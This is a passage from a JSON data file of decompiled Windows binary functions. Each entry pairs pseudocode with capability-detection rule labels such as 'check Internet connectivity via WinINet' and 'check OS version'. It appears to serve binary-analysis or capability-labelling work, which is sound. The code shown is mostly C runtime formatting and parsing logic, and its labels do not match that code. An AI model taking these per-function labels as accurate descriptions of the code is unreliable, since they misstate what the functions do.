var_c4h;\n    uint var_bch;\n    uint var_b4h;\n    uint var_ach;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_74h;\n    uint var_70h;\n    uint var_58h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0xe0);\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0xa4) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x98) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0x3c);\n    uVar7 = *(*(unaff_EBP + 0x18) + 0x30);\n    *(unaff_EBP + -4) = 0;\n    fcn.0040327e(uVar7);\n    if (*(unaff_EBP + 0x14) == '\\0') {\n        *(unaff_EBP + -4) = 2;\n        piVar2 = fcn.00403fd0(unaff_EBP + -0xa0);\n        *(unaff_EBP + -0x74) = piVar2;\n    }\n    else {\n        *(unaff_EBP + -4) = 1;\n        piVar2 = fcn.00405173(unaff_EBP + -0xa0);\n        *(unaff_EBP + -0x74) = piVar2;\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.004050a6();\n    pcVar10 = *(*piVar2 + 0x14);\n    (**0x573000)(unaff_EBP + -0x58);\n    (*pcVar10)();\n    *(unaff_EBP + -4) = 3;\n    uVar3 = fcn.004013e8();\n    uVar3 = (uVar3 ^ uVar3 >> 0x1f) - (uVar3 >> 0x1f);\n    *(unaff_EBP + -0x88) = uVar3;\n    if (*(unaff_EBP + 0x34) < uVar3 || *(unaff_EBP + 0x34) == uVar3) {\n        fcn.0040594d(0, (uVar3 - *(unaff_EBP + 0x34)) + 1, *(unaff_EBP + -0x94));\n    }\n    else {\n        pcVar12 = unaff_EBP + -0x58;\n        if (0xf < *(unaff_EBP + -0x44)) {\n            pcVar12 = *(unaff_EBP + -0x58);\n        }\n        if (*pcVar12 != '\\x7f') {\n            pcVar12 = unaff_EBP + -0x58;\n            if (0xf < *(unaff_EBP + -0x44)) {\n                pcVar12 = *(unaff_EBP + -0x58);\n            }\n            if ('\\0' < *pcVar12) {\n                uVar3 = fcn.004042a5();\n                pcVar12 = unaff_EBP + -0x58;\n                uVar3 = uVar3 & 0xffff;\n                *(unaff_EBP + -0x7c) = uVar3;\n                if (0xf < *(unaff_EBP + -0x44)) {\n                    pcVar12 = *(unaff_EBP + -0x58);\n                }\n                uVar6 = *(unaff_EBP + 0x34) - *(unaff_EBP + -0x88);\n                while (((cVar8 = *pcVar12,  cVar8 != '\\x7f' && ('\\0' < cVar8)) && (cVar8 < uVar6))) {\n                    uVar6 = uVar6 - cVar8;\n                    fcn.0040594d(uVar6, 1, uVar3);\n                    if ('\\0' < pcVar12[1]) {\n                        pcVar12 = pcVar12 + 1;\n                    }\n                    uVar3 = *(unaff_EBP + -0x7c);\n                }\n                uVar3 = *(unaff_EBP + -0x88);\n            }\n        }\n    }\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 7;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -4) = 5;\n    if (*(unaff_EBP + 0x20) == '\\0') {\n        pcVar10 = *(**(unaff_EBP + -0x74) + 0x28);\n        (**0x573000)(unaff_EBP + -0x7c);\n        (*pcVar10)();\n        *(unaff_EBP + -0x90) = *(unaff_EBP + -0x7c);\n        pcVar10 = *(**(unaff_EBP + -0x74) + 0x1c);\n    }\n    else {\n        pcVar10 = *(**(unaff_EBP + -0x74) + 0x2c);\n        (**0x573000)();\n        (*pcVar10)();\n        *(unaff_EBP + -0x90) = *(unaff_EBP + -0x7c);\n        pcVar10 = *(**(unaff_EBP + -0x74) + 0x20);\n    }\n    (**0x573000)(unaff_EBP + -0x70);\n    (*pcVar10)();\n    *(unaff_EBP + -0x7c) = 0;\n    uVar7 = *(unaff_EBP + -0x7c);\n    fcn.00404872(unaff_EBP + -0x70);\n    fcn.00405ad3(unaff_EBP + -0x70, uVar7);\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x2c) = 7;\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -4) = 7;\n    if ((*(*(unaff_EBP + -0x98) + 0x14) & 8) != 0) {\n        pcVar10 = *(**(unaff_EBP + -0x74) + 0x18);\n        (**0x573000)(unaff_EBP + -0x70);\n        (*pcVar10)();\n        *(unaff_EBP + -0x7c) = 0;\n        uVar7 = *(unaff_EBP + -0x7c);\n        fcn.00404872(unaff_EBP + -0x70);\n        fcn.00405ad3(unaff_EBP + -0x70, uVar7);\n    }\n    cVar8 = '\\0';\n    uVar6 = 0;\n    *(unaff_EBP + -0x75) = 0;\n    uVar11 = 0;\n    do {\n        cVar1 = *(unaff_EBP + -0x90 + uVar11);\n        if (cVar1 == ' ') {\n            uVar6 = uVar6 + 1;\ncode_r0x0047581c:\n            if (uVar11 != 3) {\n                cVar8 = '\\x01';\n                *(unaff_EBP + -0x75) = 1;\n            }\n        }\n        else if (cVar1 == '$') {\n            uVar6 = uVar6 + *(unaff_EBP + -0x30);\n        }\n        else if (cVar1 == '+') {\n            uVar6 = uVar6 + *(unaff_EBP + -0x18);\n        }\n        else if (cVar1 == 'v') {\n            if (*(unaff_EBP + 0x34) < uVar3 || *(unaff_EBP + 0x34) == uVar3) {\n                iVar9 = (uVar3 - *(unaff_EBP + 0x34)) + 1;\n            }\n            else {\n                iVar9 = 0;\n            }\n            cVar8 = *(unaff_EBP + -0x75);\n            uVar6 = uVar6 + (uVar3 != 0) + *(unaff_EBP + 0x34) + iVar9;\n        }\n        else if (cVar1 == 'x') goto code_r0x0047581c;\n        uVar11 = uVar11 + 1;\n    } while (uVar11 < 4);\n    iVar9 = *(unaff_EBP + -0x98);\n    if (((*(iVar9 + 0x24) < 0) || ((*(iVar9 + 0x24) < 1 && (*(iVar9 + 0x20) == 0)))) || (*(iVar9 + 0x20) <= uVar6)) {\n        arg_18h_00 = 0;\n    }\n    else {\n        arg_18h_00 = *(iVar9 + 0x20) - uVar6;\n    }\n    uVar6 = *(iVar9 + 0x14) & 0x1c0;\n    *(unaff_EBP + -0x9c) = uVar6;\n    if ((uVar6 == 0x40) || ((uVar6 == 0x100 && (cVar8 != '\\0')))) {\n        iVar9 = *(unaff_EBP + 0x10);\n        var_28h = *(unaff_EBP + 0xc);\n    }\n    else {\n        piVar2 = fcn.00403b07(unaff_EBP + -0x80, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + -0x8c), \n                              arg_18h_00);\n        arg_18h_00 = 0;\n        var_28h = *piVar2;\n        iVar9 = piVar2[1];\n        *(unaff_EBP + 0xc) = var_28h;\n        *(unaff_EBP + 0x10) = iVar9;\n    }\n    uVar6 = 0;\n    *(unaff_EBP + -0x7c) = 0;\n    do {\n        cVar8 = *(unaff_EBP + -0x90 + uVar6);\n        if (cVar8 == ' ') {\n            piVar2 = fcn.00403b07(unaff_EBP + -0xec, var_28h, iVar9, *(unaff_EBP + -0x8c), 1);\n            var_28h = *piVar2;\n            iVar9 = piVar2[1];\n            *(unaff_EBP + 0xc) = var_28h;\n            *(unaff_EBP + 0x10) = iVar9;\ncode_r0x00475a57:\n            if (*(unaff_EBP + -0x9c) != 0x100) goto code_r0x00475a88;\n            piVar2 = fcn.00403b07(unaff_EBP + -0xac, var_28h, iVar9, *(unaff_EBP + -0x8c), arg_18h_00);\n            arg_18h_00 = 0;\ncode_r0x00475a7d:\n            var_28h = *piVar2;\n            iVar9 = piVar2[1];\n            *(unaff_EBP + 0x10) = iVar9;\n            *(unaff_EBP + 0xc) = var_28h;\n        }\n        else {\n            if (cVar8 == '$') {\n                uVar6 = unaff_EBP - 0x40;\n                if (7 < *(unaff_EBP + -0x2c)) {\n                    uVar6 = *(unaff_EBP + -0x40);\n                }\n                uVar11 = *(unaff_EBP + -0x30);\n                iVar5 = unaff_EBP + -0xe4;\ncode_r0x004759e8:\n                piVar2 = fcn.00404b1f(iVar5, var_28h, iVar9, uVar6, uVar11);\n                goto code_r0x00475a7d;\n            }\n            if (cVar8 == '+') {\n                if (*(unaff_EBP + -0x18) != 0) {\n                    uVar6 = unaff_EBP - 0x28;\n                    if (7 < *(unaff_EBP + -0x14)) {\n                        uVar6 = *(unaff_EBP + -0x28);\n                    }\n                    uVar11 = 1;\n                    iVar5 = unaff_EBP + -0xdc;\n                    goto code_r0x004759e8;\n                }\n            }\n            else {\n                if (cVar8 == 'v') {\n                    if (uVar3 == 0) {\n                        uVar6 = unaff_EBP + 0x24;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            uVar6 = *(unaff_EBP + 0x24);\n                        }\n                        uVar11 = *(unaff_EBP + 0x34);\n                        iVar5 = unaff_EBP + -0xb4;\n                    }\n                    else if (*(unaff_EBP + 0x34) < uVar3 || *(unaff_EBP + 0x34) == uVar3) {\n                        uVar11 = *(unaff_EBP + -0x94);\n                        fcn.00401d9d(uVar11);\n                        uVar6 = fcn.00404f84();\n                        uVar6 = uVar6 & 0xffff;\n                        fcn.00401d9d(uVar6);\n                        puVar4 = fcn.00403b07(unaff_EBP + -0xbc, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                                              *(unaff_EBP + -0x94), uVar3 - *(unaff_EBP + 0x34));\n                        uVar7 = puVar4[1];\n                        var_28h = unaff_EBP + 0x24;\n                        *(unaff_EBP + 0xc) = *puVar4;\n                        *(unaff_EBP + 0x10) = uVar7;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            var_28h = *(unaff_EBP + 0x24);\n                        }\n                        iVar9 = *(unaff_EBP + 0x34);\n                        iVar5 = unaff_EBP + -0xc4;\n                    }\n                    else {\n                        iVar5 = *(unaff_EBP + 0x34) - uVar3;\n                        *(unaff_EBP + -0x84) = unaff_EBP + 0x24;\n                        uVar3 = *(unaff_EBP + -0x88);\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            *(unaff_EBP + -0x84) = *(unaff_EBP + 0x24);\n                            uVar3 = *(unaff_EBP + -0x88);\n                        }\n                        puVar4 = fcn.00404b1f(unaff_EBP + -0xcc, var_28h, iVar9, *(unaff_EBP + -0x84), iVar5);\n                        uVar7 = puVar4[1];\n                        *(unaff_EBP + 0xc) = *puVar4;\n                        *(unaff_EBP + 0x10) = uVar7;\n                        uVar11 = fcn.00404f84();\n                        uVar11 = uVar11 & 0xffff;\n                        fcn.00401d9d(uVar11);\n                        iVar9 = unaff_EBP + 0x24;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            iVar9 = *(unaff_EBP + 0x24);\n                        }\n                        iVar9 = iVar9 + (*(unaff_EBP + 0x34) - uVar3) * 2;\n                        var_28h = *(unaff_EBP + 0x10);\n                        iVar5 = unaff_EBP + -0xd4;\n                        uVar6 = uVar3;\n                    }\n                    goto code_r0x004759e8;\n                }\n                if (cVar8 == 'x') goto code_r0x00475a57;\n            }\n        }\ncode_r0x00475a88:\n        uVar6 = *(unaff_EBP + -0x7c) + 1;\n        *(unaff_EBP + -0x7c) = uVar6;\n        if (3 < uVar6) {\n            if (1 < *(unaff_EBP + -0x18)) {\n                iVar5 = unaff_EBP + -0x28;\n                if (7 < *(unaff_EBP + -0x14)) {\n                    iVar5 = *(unaff_EBP + -0x28);\n                }\n                piVar2 = fcn.00404b1f(unaff_EBP + -0xac, var_28h, iVar9, iVar5 + 2, *(unaff_EBP + -0x18) - 1);\n                var_28h = *piVar2;\n                iVar9 = piVar2[1];\n                *(unaff_EBP + 0xc) = var_28h;\n                *(unaff_EBP + 0x10) = iVar9;\n            }\n            iVar5 = *(unaff_EBP + -0x98);\n            uVar7 = *(unaff_EBP + -0x8c);\n            arg_8h_00 = *(unaff_EBP + -0xa4);\n            *(iVar5 + 0x20) = 0;\n            *(iVar5 + 0x24) = 0;\n            fcn.00403b07(arg_8h_00, var_28h, iVar9, uVar7, arg_18h_00);\n            if (7 < *(unaff_EBP + -0x2c)) {\n                uVar7 = *(unaff_EBP + -0x40);\n                uVar3 = *(unaff_EBP + -0x2c) * 2 + 2;\n                *(unaff_EBP + -0x7c) = uVar3;\n                *(unaff_EBP + -0x84) = uVar7;\n                if (0xfff < uVar3) {\n                    fcn.00404070(unaff_EBP + -0x84, unaff_EBP + -0x7c);\n                    uVar7 = *(unaff_EBP + -0x84);\n                }\n                fcn.00401a32(uVar7);\n            }\n            *(unaff_EBP + -0x30) = 0;\n            *(unaff_EBP + -0x40) = 0;\n            *(unaff_EBP + -0x2c) = 7;\n            if (7 < *(unaff_EBP + -0x14)) {\n                uVar7 = *(unaff_EBP + -0x28);\n                uVar3 = *(unaff_EBP + -0x14) * 2 + 2;\n                *(unaff_EBP + -0x7c) = uVar3;\n                *(unaff_EBP + -0x84) = uVar7;\n                if (0xfff < uVar3) {\n                    fcn.00404070(unaff_EBP + -0x84, unaff_EBP + -0x7c);\n                    uVar7 = *(unaff_EBP + -0x84);\n                }\n                fcn.00401a32(uVar7);\n            }\n            *(unaff_EBP + -0x18) = 0;\n            *(unaff_EBP + -0x14) = 7;\n            *(unaff_EBP + -0x28) = 0;\n            fcn.004029b9();\n            fcn.00405ad3();\n            fcn.004067d0();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 4967
    },
    "00401e83": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00401e83(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t iStack12;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) != 0) {\n                return 1;\n            }\n            param_1[7] = 8;\n        }\n        else if (param_1[0xb] == 0) {\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                    return 1;\n                }\n                if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                        return 1;\n                    }\n                    if (((((cVar4 != 'd') && (cVar4 != 'i')) && (cVar4 != 'o')) && ((cVar4 != 'u' && (cVar4 != 'x'))))\n                       && (cVar4 != 'X')) {\n                        return 1;\n                    }\n                    param_1[0xb] = 9;\n                    return 1;\n                }\n                if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                    return 1;\n                }\n                if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                    return 1;\n                }\n                if (cVar4 != 'h') {\n                    return 1;\n                }\n                if (*param_1[4] == 'h') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 1;\n                }\n                else {\n                    uVar7 = 2;\n                }\n            }\n            else {\n                if (cVar4 != 'l') {\n                    if (cVar4 == 't') {\n                        param_1[0xb] = 7;\n                        return 1;\n                    }\n                    if (cVar4 == 'w') {\n                        param_1[0xb] = 0xc;\n                        return 1;\n                    }\n                    if (cVar4 == 'z') {\n                        param_1[0xb] = 6;\n                        return 1;\n                    }\n                    return 1;\n                }\n                if (*param_1[4] == 'l') {\n                    param_1[4] = param_1[4] + 1;\n                    uVar7 = 4;\n                }\n                else {\n                    uVar7 = 3;\n                }\n            }\n            param_1[0xb] = uVar7;\n            return 1;\n        }\n        puVar6 = fcn.004039a4();\n        *puVar6 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    if ((*param_1 & 8) != 0) {\n        return 1;\n    }\n    param_1[7] = 7;\n    cVar4 = *(param_1 + 0x31);\n    uStack8 = param_1;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0049ed53:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0049ed57:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0049ed5a:\n            cVar4 = fcn.00401f2d(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x0049ecff:\n                arg_8h = 0x10;\n                goto code_r0x0049ed5a;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0049ed13;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0049ece7;\n                }\n            }\ncode_r0x0049ed63:\n            cVar4 = fcn.00405934();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00406582();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x0049ed63;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x0049ed13:\n            cVar4 = fcn.004033af(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.0040246e();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x0049ed63;\n            if (cVar4 == 'i') goto code_r0x0049ed53;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00403c7e();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.00405b00();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x0049ecff;\n            }\n            goto code_r0x0049ed57;\n        }\ncode_r0x0049ece7:\n        cVar4 = fcn.004013e3();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.0040210d();\n    if (cVar4 != '\\0') {\n        return 1;\n    }\n    if (*(param_1 + 0xc) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    uStack8 = (uStack8 >> 0x10 & 0xff00) << 0x10;\n    uVar7 = param_1[8];\n    iStack12 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        uStack8._1_3_ = uStack8 >> 8;\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack8 = CONCAT31(uStack8._1_3_, 0x20);\n                    arg_ch = 1;\n                    iStack12 = 1;\n                }\n                goto code_r0x0049edf8;\n            }\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2b);\n        }\n        else {\n            uStack8 = CONCAT31(uStack8._1_3_, 0x2d);\n        }\n        iStack12 = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049edf8:\n    cVar4 = *(param_1 + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&uStack8 + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&uStack8 + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        iStack12 = arg_ch;\n    }\n    arg_14h = param_1 + 6;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403f9e(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n        arg_ch = iStack12;\n    }\n    fcn.004053da(&uStack8, arg_ch, arg_14h);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403f9e(param_1 + 0x112, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00402081(0);\n    if ((-1 < *arg_14h) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403f9e(param_1 + 0x112, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 2397
    },
    "00401e92": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00401e92(uint noname_0, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t *arg_1ch, \n            int32_t *arg_20h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint arg_8h;\n    uint var_40h;\n    uint *var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uchar var_5h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_34h = arg_10h;\n    var_2ch = arg_20h;\n    if (arg_18h < 10) {\n        iVar4 = 1;\n    }\n    else if (arg_18h < 100) {\n        iVar4 = 2;\n    }\n    else {\n        iVar4 = (999 < arg_18h) + 3;\n    }\n    var_28h = &var_24h;\n    var_30h = iVar4;\n    cVar2 = fcn.00401a9b(arg_10h);\n    for (iVar3 = 0; (cVar2 == '\\0' && (iVar3 < iVar4)); iVar3 = iVar3 + 1) {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        pcVar1 = *(*var_2ch + 0x10);\n        (**0x573000)(0x48, *(arg_ch + 6));\n        cVar2 = (*pcVar1)();\n        iVar4 = var_30h;\n        if (cVar2 == '\\0') break;\n        fcn.004047a5();\n        cVar2 = fcn.00401a9b(var_34h);\n        iVar4 = var_30h;\n    }\n    arg_8h = var_34h;\n    cVar2 = fcn.00401a9b(var_34h);\n    if (cVar2 != '\\0') goto code_r0x00470fd0;\n    if (iVar4 <= iVar3) goto code_r0x00470fd0;\n    if (*(arg_ch + 4) == '\\0') {\n        fcn.00405c40();\n    }\n    pcVar1 = *(*var_2ch + 0x38);\n    (**0x573000)(*(arg_ch + 6), 0);\n    cVar2 = (*pcVar1)();\n    if ((cVar2 != '+') && (cVar2 != '-')) goto code_r0x00470fd0;\n    var_28h = &var_24h + 1;\n    var_24h._0_1_ = cVar2;\n    while( true ) {\n        fcn.004047a5();\ncode_r0x00470fd0:\n        cVar2 = fcn.00401a9b(var_34h);\n        if ((cVar2 != '\\0') || (var_30h <= iVar3)) break;\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        pcVar1 = *(*var_2ch + 0x38);\n        (**0x573000)(*(arg_ch + 6), 0);\n        cVar2 = (*pcVar1)();\n        if (cVar2 != '0') break;\n        iVar3 = iVar3 + 1;\n    }\n    puVar5 = var_28h;\n    if (0 < iVar3) {\n        *var_28h = '0';\n        puVar5 = var_28h + 1;\n        var_28h = puVar5;\n    }\n    while (cVar2 = fcn.00401a9b(var_34h),  cVar2 == '\\0') {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        pcVar1 = *(*var_2ch + 0x38);\n        (**0x573000)(*(arg_ch + 6), 0);\n        cVar2 = (*pcVar1)();\n        puVar5 = var_28h;\n        if ((9 < cVar2 - 0x30U) || (var_30h <= iVar3)) break;\n        *var_28h = cVar2;\n        if (var_28h < &var_5h) {\n            var_28h = var_28h + 1;\n        }\n        puVar5 = var_28h;\n        iVar3 = iVar3 + 1;\n        fcn.004047a5();\n    }\n    if (iVar3 == 0) {\n        puVar5 = &var_24h;\n    }\n    *puVar5 = '\\0';\n    var_38h = 0;\n    iVar4 = fcn.004055b5(&var_24h, &var_3ch, 10, &var_38h);\n    fcn.00401a9b(var_34h);\n    if ((((var_3ch != &var_24h) && (var_38h == 0)) && (arg_14h <= iVar4)) && (iVar4 <= arg_18h)) {\n        *arg_1ch = iVar4;\n    }\n    fcn.00403085(arg_8h);\n    return;\n}\n",
        "token_count": 1276
    },
    "00401edd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00401edd(int32_t *param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    \n    if ((*param_1[7] != NULL) && (0 < *param_1[0xb])) {\n        return **param_1[7];\n    }\n    pcVar1 = *(*param_1 + 0x18);\n    (**0x573000)();\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 112
    },
    "00401f00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00401f00(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t arg_10h_00;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_ECX;\n    char cVar6;\n    char cVar7;\n    uint var_1h;\n    \n    uVar1 = *(arg_8h + 1);\n    arg_10h_00 = in_EAX & 0xffffff00 | uVar1;\n    cVar2 = arg_10h;\n    if ((uVar1 == 0x70) || (cVar2 == 'p')) {\n        return (uVar1 == 0x70) != (cVar2 != 'p');\n    }\n    cVar3 = '\\0';\n    if ((uVar1 == 0x73) || (var_1h._0_1_ = '\\0',  uVar1 == 0x53)) {\n        var_1h._0_1_ = '\\x01';\n    }\n    if ((cVar2 == 's') || (cVar7 = cVar3,  cVar2 == 'S')) {\n        cVar7 = '\\x01';\n    }\n    if ((uVar1 == 99) || (cVar6 = cVar3,  uVar1 == 0x43)) {\n        cVar6 = '\\x01';\n    }\n    if ((cVar2 == 'c') || (cVar2 == 'C')) {\n        cVar3 = '\\x01';\n    }\n    if (var_1h == '\\0') {\n        if (cVar7 != '\\0') {\n            return false;\n        }\n        if (cVar6 == '\\0') {\n            if (cVar3 != '\\0') {\n                return false;\n            }\n            cVar2 = fcn.0040583a(arg_10h_00);\n            cVar3 = fcn.0040583a(arg_10h);\n            if (cVar2 == '\\0') {\n                if (cVar3 != '\\0') {\n                    return false;\n                }\n                return *arg_8h == arg_ch;\n            }\n            if (cVar2 != cVar3) {\n                return false;\n            }\n            if ((arg_8h[3] == 9) != (arg_14h == 9)) {\n                return false;\n            }\n            iVar4 = fcn.00402739(arg_8h[3]);\n            iVar5 = fcn.00402739(arg_14h);\n            return iVar4 == iVar5;\n        }\n    }\n    else if (var_1h != cVar7) {\n        return false;\n    }\n    if (cVar6 == cVar3) {\n        cVar2 = fcn.00404737(*in_ECX, in_ECX[1], arg_10h_00, arg_8h[3]);\n        cVar3 = fcn.00404737(*in_ECX, in_ECX[1], arg_10h, arg_14h);\n        if (cVar2 == cVar3) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 765
    },
    "00401f28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401f28(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uStack8;\n    \n    if (arg_10h == 0x3000) {\n        uStack8 = 0xd;\n        arg_8h = uStack8;\n    }\n    else if ((arg_ch < 0) || ((arg_ch < 1 && (arg_8h == 0)))) {\n        if ((arg_8h | arg_ch) == 0) {\n            return arg_10h == 0;\n        }\n        uStack8 = 6;\n        arg_8h = uStack8;\n    }\n    return arg_8h;\n}\n",
        "token_count": 165
    },
    "00401f32": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
